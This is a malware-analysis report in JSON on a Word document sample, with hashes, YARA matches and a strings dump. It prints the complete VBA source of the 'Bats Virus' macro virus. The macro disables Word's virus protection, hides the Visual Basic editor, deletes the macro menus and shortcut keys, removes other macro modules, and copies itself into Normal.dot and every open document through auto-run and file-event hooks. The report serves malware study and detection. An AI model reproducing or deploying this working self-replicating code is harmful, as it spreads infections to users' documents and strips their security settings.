{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"AstecCTL\""
        ],
        "behavior": {
            "AutoClose": "Runs when the Word document is closed",
            "AutoExec": "Runs when the Word document is opened",
            "AutoOpen": "Runs when the Word document is opened",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "\n\n' This Virus was creted to test the infection routine\nSub AstecVx()\n  On Error Resume Next\n    On Error Resume Next\n    Application.UserName = \"xHeCS\"\n    With Dialogs(wdDialogFileSummaryInfo)\n        .Author = \"xHeCS\"\n        .Execute\n    End With\n    With Options\n        .ConfirmConversions = False\n        .VirusProtection = False\n        .SaveNormalPrompt = False\n    End With\n    With ActiveDocument\n        .ReadOnlyRecommended = False\n    End With\n    On Error Resume Next\n    CommandBars(\"Visual Basic\").Visible = False\n    CommandBars(\"Visual Basic\").Enabled = False\n    CommandBars(\"Visual Basic\").Protection = msoBarNoChangeVisible\n    CommandBars(\"Visual Basic\").Protection = msoBarNoCustomize\n    CommandBars(\"Tools\").Controls(\"Macro\").Delete\n    CommandBars(\"Tools\").Controls(\"Customize...\").Delete\n    CustomizationContext = NormalTemplate\n    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable\n    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable\n    NTInfected = False\n        For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1\n            clan = NormalTemplate.VBProject.VBComponents(i).Name\n                If clan = \"AstecCTL\" Then NTInfected = True\n                If (clan <> \"AstecCTL\") And (clan <> \"ThisDocument\") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems\n        Next i\n        For Each opendoc In Documents\n            ODInfected = False\n            With opendoc\n                For J = opendoc.VBProject.VBComponents.Count To 1 Step -1\n                clan = opendoc.VBProject.VBComponents(J).Name\n                    If clan = \"AstecCTL\" Then ODInfected = True\n                    If (clan <> \"AstecCTL\") And (clan <> \"ThisDocument\") And (clan <> \"Reference to Normal\") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems\n                Next J\n                If ODInfected = False Then\n                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:=\"AstecCTL\", Object:=wdOrganizerObjectProjectItems\n                    opendoc.SaveAs FileName:=opendoc.FullName\n                End If\n            End With\n        Next opendoc\n            If NTInfected = False Then\n                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=\"AstecCTL\", Object:=wdOrganizerObjectProjectItems\n                NormalTemplate.Save\n            End If\nIf (Day(Date) = 7) Then\n          MsgBox \" Bats Virus Version 1.0 by (C)2000 xHeCS \", vbCritical\nEnd If\nEnd Sub\nSub FileSave()\n    On Error Resume Next\n    Call AstecVx\n    ActiveDocument.Save\nEnd Sub\nSub FileClose()\n    On Error Resume Next\n    Call AstecVx\n    If ActiveDocument.Saved = False Then ActiveDocument.Save\n    ActiveDocument.Close\nEnd Sub\nSub FileExit()\n    On Error Resume Next\n    Call AstecVx\n    If ActiveDocument.Saved = False Then ActiveDocument.Save\n    Application.quit\nEnd Sub\nSub FileNew()\n    On Error Resume Next\n    Dialogs(wdDialogFileNew).Show\n    newfile$ = 1\n    Call AstecVx\nEnd Sub\nSub AutoOpen()\n    On Error Resume Next\n    Call AstecVx\nEnd Sub\nSub AutoExec()\n    On Error Resume Next\n    Call AstecVx\nEnd Sub\nSub AutoClose()\n    On Error Resume Next\n    Call AstecVx\nEnd Sub\nSub FileSaveAs()\n    On Error Resume Next\n    Call AstecVx\n    Dialogs(wdDialogFileSaveAs).Show\nEnd Sub\nSub FileOpen()\n    On Error Resume Next\n    Dialogs(wdDialogFileOpen).Show\n    Call AstecVx\nEnd Sub\n\n"
    },
    "filename": "VirusShare_5d2dc7c8cf6282826461b15649ef40d0",
    "filesize": 45568,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.10, Code page: 1252, Title: Bats Virus Version 1, Author: xHeCS, Template: Normal.dot, Last Saved By: xHeCS, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Total Editing Time: 07:00, Create Time/Date: Wed Dec 29 05:11:00 1999, Last Saved Time/Date: Wed Dec 29 05:43:00 1999, Number of Pages: 1, Number of Words: 24, Number of Characters: 137, Security: 0",
    "hashes": {
        "md5": "5d2dc7c8cf6282826461b15649ef40d0",
        "sha1": "ee0bf1018045e10c94db9cbb95b274ca45355a06",
        "sha256": "42eb2e0a3f65b6e5d37cd788d04ed9f2a242678acf83ca83c75951aeec5c4d36"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "Bats Virus Version 1.0 another test virus I have written to check some basic ideas.",
            "Objective : To test the effect of virus size to the ability to infect host files",
            "/ =!",
            "K<fk<f",
            "Bats Virus Version 1",
            "xHeCS",
            "Normal.dot",
            "xHeCS",
            "Microsoft Word 8.0",
            "PAcMAn ZonE",
            "Bats Virus Version 1",
            "Title",
            "_PID_GUID",
            "DEST",
            "DEST",
            "DEST",
            "DEST",
            "DEST",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "Civil2@",
            "Chirpe",
            "10.a@",
            " Ci@",
            " Ci@",
            "ii.a@",
            ".asm",
            "u Co@",
            " This Virus was creted to test the infection routine",
            "xHeCS",
            "xHeCS",
            "Visual Basic$",
            "Visual Basic$",
            "Litc",
            "Visual Basic$",
            "Visual Basic$",
            "Macro",
            "Tools",
            "Customize...",
            "Tools",
            "AstecCTL",
            "AstecCTL",
            "ThisDocument",
            "AstecCTL",
            "AstecCTL",
            "ThisDocument",
            "Reference to Normal",
            "AstecCTL",
            "AstecCTL",
            " Bats Virus Version 1.0 by (C)2000 xHeCS ",
            "Attribut",
            "e VB_Nam",
            "e = \"Ast",
            "ecCTL\"",
            "' This V",
            "irus was",
            " creted ",
            "to test ",
            "the infe",
            "ction ro",
            "utine",
            "Vx()",
            "  On E",
            "rror Resu",
            "Next",
            "2Applica",
            "Y .User",
            "xH(eCS",
            "th Dialo gs(wd",
            "leSummar`yInfo",
            ",  .Auth",
            ".Exec",
            "JEnd -",
            "24OpDs",
            "Co nfirm",
            "sFal",
            "SaveN ormal",
            "DAveD4ocn",
            "adOnlyRecommend\\= H",
            "ndBars(\"",
            "Visual Basic\").",
            "8ibl",
            "En:a",
            "JKms",
            "o!NoChan",
            "ust0omizg",
            "Tools7@str",
            "(\"Macro@",
            "...M",
            "~Templa",
            "t%FindKe@y(Buil",
            "Alt)).DisV&",
            "NT`dwME",
            "JF@ei",
            ".VB 4",
            "`(pone",
            "nts.Coun",
            "t To 1 Step -1",
            "!\taa",
            "clan\t\t(8i).}+",
            "\t\u7500en *",
            "xTru)",
            "<>\u021c) A}g",
            "Ak\")",
            "OPrganHr#C ",
            "Source:=Ak9.Fulla",
            ", Ob!':=wd",
            "ad*Item",
            "i A2Each ",
            "op{oc In e",
            "OD7;",
            "\".=%",
            "4\t(J",
            ",?BReferencec=CeC",
            ")BKBA",
            "7%?\"Yo",
            "-zerCopy-J%-DpinbM:=O",
            "!sAs ~",
            "oIf{",
            "oEtoE\"",
            "(Day0",
            "t4e)`A7sQ",
            "Ms@gBox \"t",
            "%V 1.0 ",
            "by (C)20",
            " \", @vbCritPl",
            "Call",
            "Close",
            "gt! ",
            "Exit\t\t",
            "F\tnt.",
            "!1\t,qui0n",
            "NeNw",
            "\t}\tle",
            ") .ShowC",
            "newf$0%",
            "but>o#",
            "p\u03f02As",
            "Z'0%",
            "xtT@50",
            "Z'0%",
            "xtT@50",
            "Qx[t\"",
            "xtTp",
            ">F0)",
            "xtT@",
            "]/0\\-",
            "]< '",
            "0 p(",
            "]/0\\l",
            "\tc`l",
            "]< '",
            "lf`]/0\\",
            "0`#l",
            "xt50",
            "f`]/0\\@",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WIN-98\\",
            "SYSTEM\\S",
            "tdOle2.t",
            "lb#OLE A",
            "utomatio",
            "lMSForms>",
            "E425B8",
            "461-3EAB",
            "-11D3-B2",
            "F6-D42EA4AC2011E",
            "2.TWD#Mi",
            "crosoft E< ",
            "_ Ob",
            " Librar:",
            ":\u045eO0",
            "A65B6922 -9EC9OA6",
            "CDE457C0",
            "JP\\VBE",
            "\\E(EXg(.E",
            "wNTalwN",
            " +\t,C",
            "@f OfficO",
            "G{2DF8",
            "D04C-5BF",
            "A-101B-BHDE5AA4",
            "2=PROGR",
            "AM FILES",
            "\\MICROSO",
            "FT OFFIC",
            "MSO970.DLL",
            "k# 8",
            ".0Rk",
            "sDocumenDt",
            "@1TP",
            "iDIcD",
            "AstecCTLb",
            "*\\CNormalrU",
            "DEST",
            "DEST",
            "ThisDocument",
            "AstecCTL",
            "Project",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB",
            "Word",
            "C:\\WIN-98\\SYSTEM\\StdOle2.tlb",
            "stdole",
            "AutoClose",
            "FileSaveAs",
            "a[B>",
            "C:\\WIN-98\\SYSTEM\\MSForms.TWD",
            "MSForms",
            "\"i[\u025e",
            "C:\\WIN-98\\TEMP\\VBE\\MSForms.EXD",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL",
            "Office",
            "AstecVx",
            "FileSave",
            "FileClose",
            "FileExit",
            "FileNew",
            "AutoOpen",
            "AutoExec",
            "FileOpen",
            "xHeCS",
            "Author",
            "a38699f5b",
            "f38699f8c",
            "DEST",
            "DEST",
            "Wordk",
            "Win16~",
            "Win32",
            "Project1",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Module1b",
            "AstecCTLp",
            "AstecVx",
            "Application*",
            "UserName\\",
            "Dialogs",
            "wdDialogFileSummaryInfo",
            "Author",
            "ExecuteY",
            "Options",
            "ConfirmConversions",
            "VirusProtectionoD",
            "SaveNormalPrompt\u02bc",
            "ActiveDocument\\",
            "ReadOnlyRecommended",
            "CommandBars",
            "Visible",
            "Enabled\u06ea",
            "Protection",
            "msoBarNoChangeVisible",
            "msoBarNoCustomize",
            "ControlsK",
            "Deletex",
            "CustomizationContext\u0380",
            "NormalTemplateq",
            "FindKeyo",
            "BuildKeyCodep",
            "wdKeyF11",
            "wdKeyAlt",
            "DisableI",
            "wdKeyF8 ",
            "NTInfected%",
            "VBProjectOh",
            "VBComponents",
            "Count0v",
            "clan",
            "OrganizerDelete!",
            "SourceG",
            "FullName\u041e",
            "wdOrganizerObjectProjectItems",
            "opendoc",
            "Documents",
            "ODInfected",
            "OrganizerCopy",
            "Destination\u043b",
            "SaveAsf;",
            "FileNamej",
            "Save",
            "MsgBoxR",
            "vbCritical+}",
            "FileSave",
            "FileClose_",
            "Savedd",
            "FileExitJ",
            "quit9",
            "FileNew!",
            "wdDialogFileNewH",
            "Show",
            "newfileX",
            "AutoOpen*",
            "AutoExec",
            "AutoClose",
            "FileSaveAs",
            "wdDialogFileSaveAsN",
            "FileOpen ",
            "wdDialogFileOpen",
            "Itemz",
            "_B_var_NTInfected0",
            "_B_var_i\t",
            "_B_var_clan",
            "_B_var_opendoc6",
            "_B_var_ODInfected",
            "_B_var_J",
            "_B_var_Datev",
            "Documentj",
            "Visual Basic",
            "Macro",
            "Tools",
            "Customize...",
            "AstecCTL",
            "ThisDocument",
            "VBProject",
            "VBComponents",
            "Count",
            "Name",
            "Reference to Normal",
            "FullName",
            "SaveAs",
            "FileName",
            "VBA332.DLL",
            " Bats Virus Version 1.0 by (C)2000 xHeCS ",
            "DEST",
            "DEST",
            "DEST",
            "Document",
            "Module1I",
            "ThisDocument",
            "AstecCTL",
            "ID=\"{89E79573-BDF1-11D3-B2F6-444553540000}\"",
            "Document=ThisDocument/&H00000000",
            "Module=AstecCTL",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"5E5CC7844984BE88BE88BE88BE88\"",
            "DPB=\"CFCD5617B6F926FA26FA26\"",
            "GC=\"4042D9DADADADA25\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "AstecCTL=0, 0, 0, 0, C",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL": "Library",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL": "Library",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB": "Autogen",
            "MSO970.DLL": "Library",
            "VBA332.DLL": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.299809",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
